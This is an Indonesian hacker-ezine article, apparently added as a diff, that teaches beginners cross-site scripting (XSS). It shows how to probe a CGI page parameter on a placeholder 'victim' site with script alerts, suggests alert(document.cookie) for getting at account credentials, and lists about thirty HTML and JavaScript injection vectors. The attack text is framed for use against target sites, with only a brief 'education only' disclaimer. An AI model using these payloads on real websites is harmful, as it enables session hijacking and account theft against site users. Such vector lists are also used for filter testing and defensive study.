@@ -1,0 +1,110 @@
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       04
+
+Author: the_day (Echo staff) the_day@echo.or.id |
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+== XSS <CROSS SITE SCRIPTING>  ==
+
+
+   BEGIN
+        *PENGANTAR : Karena banyak permintaan di forum untuk menulis tentang XSS
+         maka aku coba tulis tentang ezine tentang xss ini . XSS  adalah suatu
+         cara memasukan code/script HTML kedalam suatu web site dan dijalankan
+         melalui browser di client . XSS merupakan pilihan yang menarik bagi
+         para newbie yang tidak mempunyai shell dan sploit ,karena untuk melakukan
+         xss hanya di butuhkan sebuah browser. Ingat XSS adalah hanya memasukan
+         script kedalam url site target . Ada perbedaan antara XSS dengan
+         Script injetion . Xss hasilnya hanya bisa diliat secara temporary beda
+         dengan script injection yang full merubahnya sama seperti kita mendapatkan
+         root dan merubah halaman index nya.
+        *Script yang bisa digunakan untuk XSS adalah 
+                -> HTML
+                -> JavaScript
+                -> VBScript
+                -> Active X
+                -> Flash 
+        Disini aku akan coba menjelaskan yang mengunakan code Javascript.
+        Langsung aja ke permasalahanya , disini selain menggunakan Javascript
+        aku juga menggunakan file yang ada di cgi *.cgi untuk di xss ,karena 
+        banyak dari file2 cgi yang bisa di xss.
+        Pernah mungkin dari kalian membuka suatu web dan ada bacaan 
+        " 404 - data.php Not Found " dari sini kita tau bahwa ada file dari cgi
+        yang menggunakannya untuk response apabila tidak ada file di dalam server
+        nya.
+        untuk contoh jelasnya alamat web yang aktif
+        www.victim.com/cgi-bin/program.cgi?page=downloads.html
+        bagaimana kalau kita ganti alamat diatas menjadi
+        www.victim.com/cgi-bin/program.cgi?page=tes.html
+        Maka akan tampil :404 - tes.html Not Found!
+        Lalau apa yang kita bisa perbuat dengan itu , jawabnya simple aja
+        kita tes apakah web itu bisa di xss. 
+        Caranya :
+        www.victim.com/cgi-bin/program.cgi?page=<script>alert('tes XSS')</script>
+        kalau muncul kotak popup alert itu maka web tersebut bisa di xss,
+        gampang kan.
+        Kuncinya untuk memastikan apakah suatu web vuln terhadap xss , masukan
+        script <script>alert('tes')</script> didalam semua form yg ada di web tsb.
+        Selain script itu juga xss bisa digunakan untuk mengetahui password account
+        dengan cara <script>alert(document.cookie)</script>.
+        Ingat xss ini bisa secara permanen atau temporary aja.
+        selain script itu ada banyak script yg biasa digunakan :
+        
+        <a href="javascript#[code]">
+        <div onmouseover="[code]">
+        <img src="javascript:[code]">
+        <img dynsrc="javascript:[code]"> [IE]
+        <input type="image" dynsrc="javascript:[code]"> [IE]
+        <bgsound src="javascript:[code]"> [IE]
+        &<script>[code]</script>
+        &{[code]}; [N4]
+        <img src=&{[code]};> [N4]
+        <link rel="stylesheet" href="javascript:[code]">
+        <iframe src="vbscript:[code]"> [IE]
+        <img src="mocha:[code]"> [N4]
+        <img src="livescript:[code]"> [N4]
+        <a href="about:<script>[code]</script>">
+        <meta http-equiv="refresh" content="0;url=javascript:[code]">
+        <body onload="[code]">
+        <div style="background-image: url(javascript:[code]);">
+        <div style="behaviour: url([link to code]);"> [IE]
+        <div style="binding: url([link to code]);"> [Mozilla]
+        <div style="width: expression([code]);"> [IE]
+        <style type="text/javascript">[code]</style> [N4]
+        <object classid="clsid:..." codebase="javascript:[code]"> [IE]
+        <style><!--</style><script>[code]//--></script>
+        <![CDATA[<!--]]><script>[code]//--></script>
+        <!-- -- --><script>[code]</script><!-- -- -->
+        <script>[code]</script>
+        <img src="blah"onmouseover="[code]">
+        <img src="blah>" onmouseover="[code]">
+        <xml src="javascript:[code]">
+        <xml id="X"><a><b>&lt;script>[code]&lt;/script>;</b></a></xml>
+        <div datafld="b" dataformatas="html" datasrc="#X"></div>
+        [\xC0][\xBC]script>[code][\xC0][\xBC]/script> [UTF-8; IE, Opera]
+        
+        Mungkin hanya ini aja yang bisa aku buat ,semoga artikel ini bermanfaat.
+        Tulisan ini hanya untuk pendidikan dan pengetahuan aja , jadi semua
+        kembali ke diri masing2.
+        
+   EOF
+                                                                      [the_day]
+                                                                      
+   
+*greetz to: 
+	[echostaff a.k.a y3dips, moby, comex ,z3r0byt3] && sarah[MY LOVELY], 
+	pak onno, pak linus, pak eric s. Raymond, pak RM. stallman,
+  	anak2 newbie_hacker,$the community,$peci@l temen2 seperjuangan 
+
+	kritik && saran kirimkan ke the_day [at]echo.or.id
+               
+                
